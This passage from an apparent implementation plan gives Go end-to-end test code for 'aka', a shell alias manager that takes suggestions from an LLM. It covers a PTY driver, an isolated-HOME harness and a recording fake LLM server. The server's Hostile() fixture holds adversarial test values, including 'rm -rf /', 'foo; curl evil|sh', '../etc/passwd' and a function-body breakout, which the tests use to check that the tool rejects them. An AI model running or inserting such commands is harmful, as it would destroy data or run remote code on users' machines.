			end := match(pending)
			if end >= 0 {
				c.offset += end
			}
			c.mu.Unlock()
			if end >= 0 {
				return
			}
			c.t.Fatalf("process exited before %s appeared\n\n%s", what, c.dump())
		case <-time.After(20 * time.Millisecond):
		}
	}
}

// NotExpect asserts substr never appeared in the session.
func (c *Console) NotExpect(substr string) {
	c.t.Helper()
	if strings.Contains(c.Screen(), substr) {
		c.t.Fatalf("did not expect %q in output\n\n%s", substr, c.dump())
	}
}

// CountOccurrences reports how many times substr appears in the whole session.
// Used to assert a menu was not rendered twice.
func (c *Console) CountOccurrences(substr string) int {
	return strings.Count(c.Screen(), substr)
}

// Send writes keystrokes to the terminal. Always Expect the prompt you are
// answering first — never send blind.
func (c *Console) Send(keys ...string) {
	c.t.Helper()
	for _, k := range keys {
		if _, err := io.WriteString(c.ptmx, k); err != nil {
			c.t.Fatalf("write %q to pty: %v\n\n%s", k, err, c.dump())
		}
	}
}

// SendLine sends s followed by Enter.
func (c *Console) SendLine(s string) {
	c.t.Helper()
	c.Send(s, Enter)
}

// Screen returns everything received so far, ANSI-stripped.
func (c *Console) Screen() string {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.stripped.String()
}

// Wait closes the terminal, waits for the process, and returns its exit code.
func (c *Console) Wait() int {
	c.t.Helper()
	c.waitOnce.Do(func() {
		<-c.readDone
		err := c.cmd.Wait()
		var exitErr *exec.ExitError
		switch {
		case err == nil:
			c.exitCode = 0
		case errors.As(err, &exitErr):
			c.exitCode = exitErr.ExitCode()
		default:
			c.t.Fatalf("wait for %v: %v\n\n%s", c.cmd.Args, err, c.dump())
		}
	})
	return c.exitCode
}

// dump renders the tail of the session for failure messages. A PTY test that
// fails with only "timed out waiting for X" is unmaintainable.
func (c *Console) dump() string {
	c.mu.Lock()
	stripped := c.stripped.String()
	raw := c.raw.String()
	c.mu.Unlock()

	var sb strings.Builder
	sb.WriteString("--- screen (ANSI stripped, last 40 lines) ---\n")
	sb.WriteString(tailLines(stripped, 40))
	sb.WriteString("\n--- raw (last 2000 bytes) ---\n")
	sb.WriteString(tailBytes(raw, 2000))
	sb.WriteString("\n--- end ---")
	return sb.String()
}

func tailLines(s string, n int) string {
	lines := strings.Split(s, "\n")
	if len(lines) > n {
		lines = lines[len(lines)-n:]
	}
	return strings.Join(lines, "\n")
}

func tailBytes(s string, n int) string {
	if len(s) > n {
		return s[len(s)-n:]
	}
	return s
}
```

Add `"strconv"` to the import block — `Expect` and `ExpectRe` use `strconv.Quote`.

- [ ] **Step 5: Run test to verify it passes**

Run: `make e2e`
Expected: all five `pty_test.go` tests PASS, plus the two from Task 3.

- [ ] **Step 6: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/pty.go test/e2e/pty_test.go go.mod go.sum
git commit -m "test(e2e): add PTY console driver with consuming expect semantics"
```

---

## Task 5: The environment harness

**Files:**
- Create: `test/e2e/harness.go`
- Create: `test/e2e/harness_test.go`

**Interfaces:**
- Consumes: `newConsole`, `akaBin`, key constants from Tasks 3–4.
- Produces:
  - `type Env struct { t *testing.T; Home, Shell string; LLM *fakellm.Server }` — **note:** the `LLM` field is added in Task 6; Task 5 creates `Env` without it.
  - `func NewEnv(t *testing.T, shell string) *Env`
  - `func (e *Env) SeedConfig(c ConfigTOML)` / `type ConfigTOML struct{ Provider, Model, APIKey string }`
  - `func (e *Env) SeedHistory(cmds ...string)` — writes shell-appropriate history with synthetic timestamps 60s apart
  - `func (e *Env) SeedRC(content string)`
  - `func (e *Env) Spawn(args ...string) *Console` — PTY
  - `func (e *Env) Run(args ...string) (output string, code int)` — no PTY
  - `func (e *Env) RunShell(script string) (output string, code int)` — real interactive shell
  - `func (e *Env) Path(rel ...string) string` — path under `$HOME`
  - `func (e *Env) ReadFile(rel ...string) string`
  - `func (e *Env) FileMode(rel ...string) os.FileMode`
  - `func (e *Env) Installed() []aliases.InstalledEntry`
  - `func (e *Env) Backups() []string`

- [ ] **Step 1: Write the failing test**

Create `test/e2e/harness_test.go`:

```go
//go:build e2e

package e2e

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestEnvIsolatesHome(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")

	if !strings.HasPrefix(env.Home, os.TempDir()) {
		t.Fatalf("Home = %q, want a path under %q", env.Home, os.TempDir())
	}
	if env.Home == os.Getenv("HOME") {
		t.Fatal("Home must not be the real HOME")
	}
}

// An uninitialised shell must be reported as such — this proves $HOME really is
// the temp dir, since the developer's own HOME would already be initialised.
func TestUninitialisedShellIsReported(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	out, code := env.Run("list")

	if code != 0 {
		t.Fatalf("exit code = %d, want 0\n%s", code, out)
	}
	if !strings.Contains(out, "Shell 'zsh' is not set up with AKA.") {
		t.Fatalf("missing the not-set-up message:\n%s", out)
	}
}

func TestSeedHistoryWritesZshExtendedFormat(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	env.SeedHistory("git status", "git commit -m 'x'")

	content := env.ReadFile(".zsh_history")
	if !strings.Contains(content, ";git status") {
		t.Fatalf("history missing seeded command:\n%s", content)
	}
	if !strings.HasPrefix(content, ": ") {
		t.Fatalf("history is not in zsh extended format:\n%s", content)
	}
}

func TestSeedHistoryWritesBashPlainFormat(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "bash")
	env.SeedHistory("ls -la", "cd /tmp")

	content := env.ReadFile(".bash_history")
	if content != "ls -la\ncd /tmp\n" {
		t.Fatalf("bash history = %q", content)
	}
}

func TestSeedConfigWritesRestrictivePermissions(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	env.SeedConfig(ConfigTOML{Provider: "anthropic", Model: "claude-haiku-4-5-20251001", APIKey: "e2e-key"})

	if mode := env.FileMode(".config", "aka", "config.toml"); mode.Perm() != 0o600 {
		t.Fatalf("config.toml mode = %o, want 600", mode.Perm())
	}
	if !strings.Contains(env.ReadFile(".config", "aka", "config.toml"), "e2e-key") {
		t.Fatal("config.toml missing the seeded key")
	}
}

func TestRunShellExecutesInIsolatedHome(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	out, code := env.RunShell("echo $HOME")

	if code != 0 {
		t.Fatalf("exit code = %d\n%s", code, out)
	}
	if strings.TrimSpace(out) != env.Home {
		t.Fatalf("shell $HOME = %q, want %q", strings.TrimSpace(out), env.Home)
	}
}

func TestSpawnDrivesAkaOverPTY(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	c := env.Spawn("--help")
	c.Expect("shell history scanner and alias manager")
	if code := c.Wait(); code != 0 {
		t.Fatalf("exit code = %d", code)
	}
}

func TestPathJoinsUnderHome(t *testing.T) {
	t.Parallel()

	env := NewEnv(t, "zsh")
	want := filepath.Join(env.Home, ".config", "aka", "zsh")
	if got := env.Path(".config", "aka", "zsh"); got != want {
		t.Fatalf("Path = %q, want %q", got, want)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `make e2e`
Expected: FAIL — `undefined: NewEnv`, `undefined: ConfigTOML`.

- [ ] **Step 3: Write the implementation**

Create `test/e2e/harness.go`:

```go
//go:build e2e

package e2e

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/ntalmon/aka/internal/aliases"
)

// Env is one isolated aka installation: a throwaway $HOME plus helpers to seed
// fixtures, run the binary, and inspect what it wrote.
//
// Everything crosses the process boundary — argv, PTY, exit code, and files
// under Home. No product function is ever called in-process.
type Env struct {
	t     *testing.T
	Home  string
	Shell string // "zsh" or "bash"
}

// NewEnv creates an isolated environment for the given shell.
func NewEnv(t *testing.T, shell string) *Env {
	t.Helper()
	if shell != "zsh" && shell != "bash" {
		t.Fatalf("unsupported shell %q", shell)
	}
	return &Env{t: t, Home: t.TempDir(), Shell: shell}
}

// ConfigTOML is the subset of config.toml the tests seed.
type ConfigTOML struct {
	Provider string
	Model    string
	APIKey   string
}

// SeedConfig writes ~/.config/aka/config.toml so aka does not prompt for a key.
func (e *Env) SeedConfig(c ConfigTOML) {
	e.t.Helper()

	dir := e.Path(".config", "aka")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		e.t.Fatalf("mkdir %s: %v", dir, err)
	}

	keyField := "anthropic_api_key"
	switch c.Provider {
	case "groq":
		keyField = "groq_api_key"
	case "openai":
		keyField = "openai_api_key"
	case "gemini":
		keyField = "gemini_api_key"
	}

	body := fmt.Sprintf("provider = %q\nmodel = %q\nmax_history = 500\n%s = %q\n",
		c.Provider, c.Model, keyField, c.APIKey)

	path := filepath.Join(dir, "config.toml")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		e.t.Fatalf("write config.toml: %v", err)
	}
}

// SeedHistory writes the commands to the shell's history file, spacing
// synthetic timestamps 60 seconds apart so they read as one work session.
func (e *Env) SeedHistory(cmds ...string) {
	e.t.Helper()

	var sb strings.Builder
	if e.Shell == "zsh" {
		ts := time.Now().Add(-time.Duration(len(cmds)) * time.Minute).Unix()
		for _, cmd := range cmds {
			fmt.Fprintf(&sb, ": %d:0;%s\n", ts, cmd)
			ts += 60
		}
		e.writeHome(".zsh_history", sb.String(), 0o600)
		return
	}
	for _, cmd := range cmds {
		fmt.Fprintf(&sb, "%s\n", cmd)
	}
	e.writeHome(".bash_history", sb.String(), 0o600)
}

// SeedRC writes the shell's rc file with pre-existing content, so tests can
// prove `aka init` appends rather than clobbers.
func (e *Env) SeedRC(content string) {
	e.t.Helper()
	e.writeHome(e.rcName(), content, 0o644)
}

func (e *Env) rcName() string {
	if e.Shell == "zsh" {
		return ".zshrc"
	}
	return ".bashrc"
}

func (e *Env) writeHome(name, content string, mode os.FileMode) {
	e.t.Helper()
	if err := os.WriteFile(e.Path(name), []byte(content), mode); err != nil {
		e.t.Fatalf("write %s: %v", name, err)
	}
}

// environ returns the process environment for an aka invocation.
func (e *Env) environ(extra ...string) []string {
	env := []string{
		"HOME=" + e.Home,
		"AKA_SHELL=" + e.Shell,
		"TERM=xterm-256color",
		"PATH=" + os.Getenv("PATH"),
		"LANG=C.UTF-8",
	}
	return append(env, extra...)
}

// Spawn runs aka attached to a PTY, for interactive flows.
func (e *Env) Spawn(args ...string) *Console {
	e.t.Helper()
	cmd := exec.Command(akaBin, args...)
	cmd.Env = e.environ(e.extraEnv...)
	cmd.Dir = e.Home
	return newConsole(e.t, cmd)
}

// Run executes aka without a terminal and returns combined output and the exit
// code. Use it only for flows that never prompt.
func (e *Env) Run(args ...string) (string, int) {
	e.t.Helper()
	cmd := exec.Command(akaBin, args...)
	cmd.Env = e.environ(e.extraEnv...)
	cmd.Dir = e.Home
	out, err := cmd.CombinedOutput()
	return string(out), exitCodeOf(e.t, err, out)
}

// RunShell runs script in a real interactive shell with the isolated HOME, so
// the rc file and any sourced aliases are actually loaded.
func (e *Env) RunShell(script string) (string, int) {
	e.t.Helper()
	cmd := exec.Command(e.Shell, "-i", "-c", script)
	cmd.Env = e.environ(e.extraEnv...)
	cmd.Dir = e.Home
	out, err := cmd.CombinedOutput()
	return string(out), exitCodeOf(e.t, err, out)
}

func exitCodeOf(t *testing.T, err error, out []byte) int {
	t.Helper()
	if err == nil {
		return 0
	}
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode()
	}
	t.Fatalf("command failed to run: %v\n%s", err, out)
	return -1
}

// Path joins rel under the isolated HOME.
func (e *Env) Path(rel ...string) string {
	return filepath.Join(append([]string{e.Home}, rel...)...)
}

// ShellPath joins rel under ~/.config/aka/<shell>/.
func (e *Env) ShellPath(rel ...string) string {
	return e.Path(append([]string{".config", "aka", e.Shell}, rel...)...)
}

// ReadFile reads a file under HOME, failing the test if it is missing.
func (e *Env) ReadFile(rel ...string) string {
	e.t.Helper()
	data, err := os.ReadFile(e.Path(rel...))
	if err != nil {
		e.t.Fatalf("read %s: %v", filepath.Join(rel...), err)
	}
	return string(data)
}

// FileMode returns the mode of a file under HOME.
func (e *Env) FileMode(rel ...string) os.FileMode {
	e.t.Helper()
	info, err := os.Stat(e.Path(rel...))
	if err != nil {
		e.t.Fatalf("stat %s: %v", filepath.Join(rel...), err)
	}
	return info.Mode()
}

// AliasesFile returns the contents of the managed aliases.sh.
func (e *Env) AliasesFile() string {
	e.t.Helper()
	data, err := os.ReadFile(e.ShellPath("aliases.sh"))
	if err != nil {
		e.t.Fatalf("read aliases.sh: %v", err)
	}
	return string(data)
}

// Installed unmarshals installed.json. Returns nil when the file is absent.
func (e *Env) Installed() []aliases.InstalledEntry {
	e.t.Helper()
	data, err := os.ReadFile(e.ShellPath("installed.json"))
	if os.IsNotExist(err) {
		return nil
	}
	if err != nil {
		e.t.Fatalf("read installed.json: %v", err)
	}
	var entries []aliases.InstalledEntry
	if err := json.Unmarshal(data, &entries); err != nil {
		e.t.Fatalf("unmarshal installed.json: %v\n%s", err, data)
	}
	return entries
}

// Backups lists the timestamped snapshot filenames, sorted.
func (e *Env) Backups() []string {
	e.t.Helper()
	dirEntries, err := os.ReadDir(e.ShellPath("backups"))
	if os.IsNotExist(err) {
		return nil
	}
	if err != nil {
		e.t.Fatalf("read backups dir: %v", err)
	}
	var names []string
	for _, d := range dirEntries {
		names = append(names, d.Name())
	}
	sort.Strings(names)
	return names
}
```

Two details to get right while writing this file:

1. Add `"errors"` to the import block (used by `exitCodeOf`).
2. `Env` needs an `extraEnv []string` field, referenced by `Spawn`/`Run`/`RunShell`. Add it to the struct:

```go
type Env struct {
	t         *testing.T
	Home      string
	Shell     string
	extraEnv  []string
}
```

and a setter used by Task 6 onward:

```go
// SetEnv adds variables to every subsequent aka invocation.
func (e *Env) SetEnv(kv ...string) {
	e.extraEnv = append(e.extraEnv, kv...)
}
```

- [ ] **Step 4: Verify `InstalledEntry` field names before relying on them**

Run: `grep -n 'type InstalledEntry' -A 12 internal/aliases/aliases.go`
Expected: confirms the JSON tags used by `Installed()`. Adjust the test assertions in later tasks to the real field names — do not guess.

- [ ] **Step 5: Run test to verify it passes**

Run: `make e2e`
Expected: all eight `harness_test.go` tests PASS.

- [ ] **Step 6: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/harness.go test/e2e/harness_test.go
git commit -m "test(e2e): add isolated-HOME environment harness"
```

---

## Task 6: The fake LLM server

**Files:**
- Create: `test/e2e/fakellm/server.go`
- Create: `test/e2e/fakellm/responses.go`
- Create: `test/e2e/fakellm/server_test.go`
- Modify: `test/e2e/harness.go` (add the `LLM` field and wire `AKA_LLM_BASE_URL`)

**Interfaces:**
- Consumes: `replaceBase`-backed `WithBaseURL` from Task 2 (used by the self-test only).
- Produces:
  - `type Recorded struct { Path string; Header http.Header; Body []byte }`
  - `type Responder func(req Recorded) (status int, body []byte)`
  - `func New(t *testing.T) *Server` — starts an `httptest` server on 127.0.0.1 serving `/v1/messages` and `/v1/chat/completions` (and `/openai/v1/chat/completions` for Groq's path)
  - `func (s *Server) URL() string`, `func (s *Server) Respond(r Responder)`, `func (s *Server) Requests() []Recorded`
  - `type Suggestion struct{ Name, Kind, Template, Rationale string; Params []Param; ExampleUses []string }`, `type Param struct{ Name, Description string }`
  - `func Normal(suggs ...Suggestion) Responder`
  - `func Hostile() Responder`
  - `func TokenLimit(then Responder) Responder` — errors once, then delegates
  - `func Malformed() Responder`
  - `func (e *Env) LLM` on the harness side

**Note on the one sanctioned `internal/` import:** `fakellm/server_test.go` imports `internal/llm` to prove the fake's JSON parses with the *real* providers. That is a test *of the fixture*, not of `aka`. The scenario tests in `test/e2e` never do this.

- [ ] **Step 1: Write the failing test**

Create `test/e2e/fakellm/server_test.go`:

```go
//go:build e2e

package fakellm

import (
	"context"
	"strings"
	"testing"

	"github.com/ntalmon/aka/internal/history"
	"github.com/ntalmon/aka/internal/llm"
)

var sampleSuggestions = []Suggestion{
	{
		Name:      "e2egs",
		Kind:      "alias",
		Template:  "git status --short",
		Rationale: "Runs git status constantly.",
	},
	{
		Name:        "e2edeploy",
		Kind:        "function",
		Template:    "git add -A\ngit commit -m \"$1\"\ngit push",
		Params:      []Param{{Name: "message", Description: "commit message"}},
		Rationale:   "Combines the add/commit/push sequence.",
		ExampleUses: []string{"e2edeploy 'fix bug'"},
	},
}

// The fake must speak the protocol the real Anthropic parser expects.
func TestAnthropicProviderParsesFakeResponse(t *testing.T) {
	srv := New(t)
	srv.Respond(Normal(sampleSuggestions...))

	got, err := llm.New("test-key").WithBaseURL(srv.URL()).
		Suggest(context.Background(), []history.Entry{{Command: "git status"}})
	if err != nil {
		t.Fatalf("Suggest: %v", err)
	}
	assertRoundTrip(t, got)

	reqs := srv.Requests()
	if len(reqs) != 1 {
		t.Fatalf("recorded %d requests, want 1", len(reqs))
	}
	if reqs[0].Path != "/v1/messages" {
		t.Fatalf("path = %q, want /v1/messages", reqs[0].Path)
	}
	if reqs[0].Header.Get("X-API-Key") != "test-key" {
		t.Fatalf("X-API-Key = %q", reqs[0].Header.Get("X-API-Key"))
	}
}

// ...and the OpenAI-compatible parser too.
func TestGroqProviderParsesFakeResponse(t *testing.T) {
	srv := New(t)
	srv.Respond(Normal(sampleSuggestions...))

	got, err := llm.NewGroq("test-key").WithBaseURL(srv.URL()).
		Suggest(context.Background(), []history.Entry{{Command: "git status"}})
	if err != nil {
		t.Fatalf("Suggest: %v", err)
	}
	assertRoundTrip(t, got)
}

func TestRecorderCapturesRequestBody(t *testing.T) {
	srv := New(t)
	srv.Respond(Normal())

	_, err := llm.New("k").WithBaseURL(srv.URL()).
		Suggest(context.Background(), []history.Entry{{Command: "echo hello-marker"}})
	if err != nil {
		t.Fatalf("Suggest: %v", err)
	}

	body := string(srv.Requests()[0].Body)
	if !strings.Contains(body, "hello-marker") {
		t.Fatalf("request body did not contain the command:\n%s", body)
	}
}

// TokenLimit must produce the exact error the retry loop in runScan keys on.
func TestTokenLimitProducesErrTokenLimit(t *testing.T) {
	srv := New(t)
	srv.Respond(TokenLimit(Normal(sampleSuggestions...)))

	provider := llm.NewGroq("k").WithBaseURL(srv.URL())

	_, err := provider.Suggest(context.Background(), []history.Entry{{Command: "x"}})
	var tokenErr *llm.ErrTokenLimit
	if !errors.As(err, &tokenErr) {
		t.Fatalf("first call error = %v (%T), want *llm.ErrTokenLimit", err, err)
	}

	got, err := provider.Suggest(context.Background(), []history.Entry{{Command: "x"}})
	if err != nil {
		t.Fatalf("second call: %v", err)
	}
	assertRoundTrip(t, got)
}

func TestMalformedProducesParseError(t *testing.T) {
	srv := New(t)
	srv.Respond(Malformed())

	if _, err := llm.New("k").WithBaseURL(srv.URL()).
		Suggest(context.Background(), []history.Entry{{Command: "x"}}); err == nil {
		t.Fatal("expected an error for a malformed response")
	}
}

func assertRoundTrip(t *testing.T, got []llm.Suggestion) {
	t.Helper()
	if len(got) != len(sampleSuggestions) {
		t.Fatalf("got %d suggestions, want %d", len(got), len(sampleSuggestions))
	}
	for i, want := range sampleSuggestions {
		if got[i].Name != want.Name {
			t.Errorf("suggestion %d name = %q, want %q", i, got[i].Name, want.Name)
		}
		if got[i].Kind != want.Kind {
			t.Errorf("suggestion %d kind = %q, want %q", i, got[i].Kind, want.Kind)
		}
		if got[i].Template != want.Template {
			t.Errorf("suggestion %d template = %q, want %q", i, got[i].Template, want.Template)
		}
	}
}
```

Add `"errors"` to this file's imports.

- [ ] **Step 2: Run test to verify it fails**

Run: `make e2e`
Expected: FAIL — `undefined: New`, `undefined: Normal`, `undefined: Suggestion`.

- [ ] **Step 3: Write `test/e2e/fakellm/server.go`**

```go
//go:build e2e

// Package fakellm serves the genuine Anthropic and OpenAI-compatible wire
// protocols from a local HTTP server, so aka's real provider code performs real
// requests with real JSON parsing against responses the test controls.
//
// It records every request, which is what lets tests assert on the bytes that
// actually crossed the socket rather than on a function's return value.
package fakellm

import (
	"io"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"
)

// Recorded is one request the server received.
type Recorded struct {
	Path   string
	Header http.Header
	Body   []byte
}

// Responder produces the status and body for a request.
type Responder func(req Recorded) (status int, body []byte)

// Server is a recording, programmable stand-in for an LLM provider endpoint.
type Server struct {
	t   *testing.T
	srv *httptest.Server

	mu        sync.Mutex
	responder Responder
	requests  []Recorded
}

// New starts a server on 127.0.0.1. The loopback bind satisfies aka's
// AKA_LLM_BASE_URL guard without any special handling. It is shut down at test
// cleanup.
func New(t *testing.T) *Server {
	t.Helper()

	s := &Server{t: t, responder: Normal()}
	s.srv = httptest.NewServer(http.HandlerFunc(s.handle))
	t.Cleanup(s.srv.Close)
	return s
}

// URL returns the server's base URL, suitable for AKA_LLM_BASE_URL.
func (s *Server) URL() string { return s.srv.URL }

// Respond sets the responder used for subsequent requests.
func (s *Server) Respond(r Responder) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.responder = r
}

// Requests returns a copy of everything received so far.
func (s *Server) Requests() []Recorded {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]Recorded, len(s.requests))
	copy(out, s.requests)
	return out
}

func (s *Server) handle(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read body", http.StatusInternalServerError)
		return
	}

	rec := Recorded{Path: r.URL.Path, Header: r.Header.Clone(), Body: body}

	s.mu.Lock()
	s.requests = append(s.requests, rec)
	responder := s.responder
	s.mu.Unlock()

	status, respBody := responder(rec)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	if _, err := w.Write(respBody); err != nil {
		s.t.Errorf("write response: %v", err)
	}
}
```

- [ ] **Step 4: Write `test/e2e/fakellm/responses.go`**

```go
//go:build e2e

package fakellm

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync/atomic"
)

// Suggestion mirrors llm.Suggestion's JSON shape. It is redeclared here rather
// than imported so the fixture package stays independent of the code under test.
type Suggestion struct {
	Name        string   `json:"name"`
	Kind        string   `json:"kind"`
	Template    string   `json:"template"`
	Params      []Param  `json:"params"`
	Rationale   string   `json:"rationale"`
	ExampleUses []string `json:"example_uses"`
}

// Param mirrors aliases.Param.
type Param struct {
	Name        string `json:"name"`
	Description string `json:"description,omitempty"`
}

// Normal returns the suggestions as a successful tool call, in whichever wire
// format matches the requested path.
func Normal(suggs ...Suggestion) Responder {
	if suggs == nil {
		suggs = []Suggestion{}
	}
	return func(req Recorded) (int, []byte) {
		return http.StatusOK, encodeToolCall(req.Path, suggs)
	}
}

// Hostile returns adversarial suggestions: names that are not shell
// identifiers, and templates that attempt to break out of the generated
// function body. aka must reject every one of these.
func Hostile() Responder {
	return Normal(
		Suggestion{Name: "rm -rf /", Kind: "alias", Template: "echo pwned", Rationale: "hostile name with spaces"},
		Suggestion{Name: "foo; curl evil|sh", Kind: "alias", Template: "echo pwned", Rationale: "hostile name with metacharacters"},
		Suggestion{Name: "../etc/passwd", Kind: "alias", Template: "echo pwned", Rationale: "hostile path-like name"},
		Suggestion{Name: "9lives", Kind: "alias", Template: "echo pwned", Rationale: "name starting with a digit"},
		Suggestion{Name: strings.Repeat("a", 200), Kind: "alias", Template: "echo pwned", Rationale: "over-long name"},
		Suggestion{Name: "e2ebreakout", Kind: "function", Template: "echo one\n}\necho escaped", Rationale: "closes the function body early"},
		Suggestion{Name: "e2equote", Kind: "alias", Template: `echo 'it'\''s fine'`, Rationale: "single quotes in an alias body"},
		Suggestion{Name: "e2enewline", Kind: "alias", Template: "echo first\necho second", Rationale: "newline inside an alias body"},
		// Accepted by the current validator — asserted as documented behaviour,
		// not silently treated as a bug. See the plan's Task 10 note.
		Suggestion{Name: "e2esubshell", Kind: "function", Template: `echo "$(date)"`, Rationale: "command substitution in a function body"},
	)
}

// TokenLimit fails the first request with the error shape that
// openaicompat.go converts into *llm.ErrTokenLimit, then delegates to then.
// This drives the halving retry loop in runScan.
func TokenLimit(then Responder) Responder {
	var fired atomic.Bool
	return func(req Recorded) (int, []byte) {
		if fired.CompareAndSwap(false, true) {
			body := []byte(`{"error":{"type":"tokens","code":"context_length_exceeded",` +
				`"message":"Request too large for model"}}`)
			return http.StatusRequestEntityTooLarge, body
		}
		return then(req)
	}
}

// Malformed returns a 200 with a body that is not valid JSON.
func Malformed() Responder {
	return func(Recorded) (int, []byte) {
		return http.StatusOK, []byte(`{"content": [ this is not json`)
	}
}

// encodeToolCall renders the suggestions in the format the requested endpoint
// uses: an Anthropic tool_use content block, or an OpenAI tool_calls entry
// whose arguments field is a JSON *string*.
func encodeToolCall(path string, suggs []Suggestion) []byte {
	args, err := json.Marshal(map[string]any{"suggestions": suggs})
	if err != nil {
		panic(fmt.Sprintf("fakellm: marshal suggestions: %v", err))
	}

	var payload any
	if strings.HasSuffix(path, "/v1/messages") {
		payload = map[string]any{
			"id":          "msg_e2e",
			"type":        "message",
			"role":        "assistant",
			"model":       "e2e-model",
			"stop_reason": "tool_use",
			"content": []any{map[string]any{
				"type":  "tool_use",
				"id":    "toolu_e2e",
				"name":  "suggest_aliases",
				"input": json.RawMessage(args),
			}},
		}
	} else {
		payload = map[string]any{
			"id":     "chatcmpl-e2e",
			"object": "chat.completion",
			"model":  "e2e-model",
			"choices": []any{map[string]any{
				"index":         0,
				"finish_reason": "tool_calls",
				"message": map[string]any{
					"role": "assistant",
					"tool_calls": []any{map[string]any{
						"id":   "call_e2e",
						"type": "function",
						"function": map[string]any{
							"name":      "suggest_aliases",
							"arguments": string(args),
						},
					}},
				},
			}},
		}
	}

	body, err := json.Marshal(payload)
	if err != nil {
		panic(fmt.Sprintf("fakellm: marshal payload: %v", err))
	}
	return body
}
```

- [ ] **Step 5: Wire the server into the harness**

In `test/e2e/harness.go`, add the field and start the server in `NewEnv`:

```go
type Env struct {
	t        *testing.T
	Home     string
	Shell    string
	LLM      *fakellm.Server
	extraEnv []string
}

func NewEnv(t *testing.T, shell string) *Env {
	t.Helper()
	if shell != "zsh" && shell != "bash" {
		t.Fatalf("unsupported shell %q", shell)
	}
	e := &Env{t: t, Home: t.TempDir(), Shell: shell}
	e.LLM = fakellm.New(t)
	e.SetEnv("AKA_LLM_BASE_URL=" + e.LLM.URL())
	return e
}
```

Add the import: `"github.com/ntalmon/aka/test/e2e/fakellm"`.

- [ ] **Step 6: Run test to verify it passes**

Run: `make e2e`
Expected: all `fakellm` tests PASS, and the Task 5 harness tests still PASS.

- [ ] **Step 7: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/fakellm/ test/e2e/harness.go
git commit -m "test(e2e): add recording fake LLM server speaking both wire protocols"
```

---

## Task 7: Shell wiring scenarios

**Files:**
- Create: `test/e2e/init_test.go`

**Interfaces:**
- Consumes: `NewEnv`, `Env.Run`, `Env.Spawn`, `Env.SeedRC`, `Env.SeedConfig`, `Env.RunShell`, `Env.FileMode`, `Console.Expect`.
- Produces: nothing consumed by later tasks.

**Exact strings this task asserts on** (verified against the source — do not paraphrase):

- wrapper marker: `# Added by aka init — shell wrapper — zsh`
- wrapper body line: `AKA_SHELL=zsh command aka "$@"`
- source line: `[ -f "$HOME/.config/aka/zsh/aliases.sh" ] && . "$HOME/.config/aka/zsh/aliases.sh"`
- already-initialised: `Shell 'zsh' is already initialized.`
- fish: `fish shell is not supported in v0.1`
- provider prompt: `Choose an LLM provider:`
- key prompt: `Enter your Anthropic API key:`
- model prompt: `Choose a model:`

- [ ] **Step 1: Write the failing test**

Create `test/e2e/init_test.go`:

```go
//go:build e2e

package e2e

import (
	"os"
	"strings"
	"testing"
)

const existingRC = "# my own rc\nexport EDITOR=vim\nalias myown='echo mine'\n"

func seededEnv(t *testing.T, shell string) *Env {
	t.Helper()
	env := NewEnv(t, shell)
	env.SeedRC(existingRC)
	env.SeedConfig(ConfigTOML{
		Provider: "anthropic",
		Model:    "claude-haiku-4-5-20251001",
		APIKey:   "e2e-test-key",
	})
	return env
}

func TestInitWiresZshRC(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	out, code := env.Run("init", "--shell", "zsh")
	if code != 0 {
		t.Fatalf("exit code = %d\n%s", code, out)
	}

	rc := env.ReadFile(".zshrc")

	if !strings.Contains(rc, "alias myown='echo mine'") {
		t.Error("init clobbered pre-existing rc content")
	}
	for _, want := range []string{
		"# Added by aka init — shell wrapper — zsh",
		`AKA_SHELL=zsh command aka "$@"`,
		`[ -f "$HOME/.config/aka/zsh/aliases.sh" ] && . "$HOME/.config/aka/zsh/aliases.sh"`,
	} {
		if !strings.Contains(rc, want) {
			t.Errorf("rc missing %q\n---\n%s", want, rc)
		}
	}
}

func TestInitCreatesRuntimeFilesWithTightPermissions(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatalf("exit code = %d", code)
	}

	if mode := env.FileMode(".config", "aka"); mode.Perm() != 0o700 {
		t.Errorf("~/.config/aka mode = %o, want 700", mode.Perm())
	}
	if mode := env.FileMode(".config", "aka", "zsh", "aliases.sh"); mode.Perm() != 0o600 {
		t.Errorf("aliases.sh mode = %o, want 600", mode.Perm())
	}
	if mode := env.FileMode(".config", "aka", "config.toml"); mode.Perm() != 0o600 {
		t.Errorf("config.toml mode = %o, want 600", mode.Perm())
	}
}

func TestInitIsIdempotent(t *testing.T) {
	t.Parallel()

	env := seededEnv(t, "zsh")
	if _, code := env.Run("init", "--shell", "zsh"); code != 0 {
		t.Fatal("first init failed")
	}

	out, code := env.Run("init", "--shell", "zsh")
	if code != 0 {
		t.Fatalf("second init exit code = %d\n%s", code, out)
	}
	if !strings.Contains(out, "Shell 'zsh' is already initialized.") {
		t.Errorf("missing already-initialized message:\n%s", out)
	}

	rc := env.ReadFile(".zshrc")
	if n := strings.Count(rc, "# Added by aka init — shell wrapper — zsh"); n != 1 {
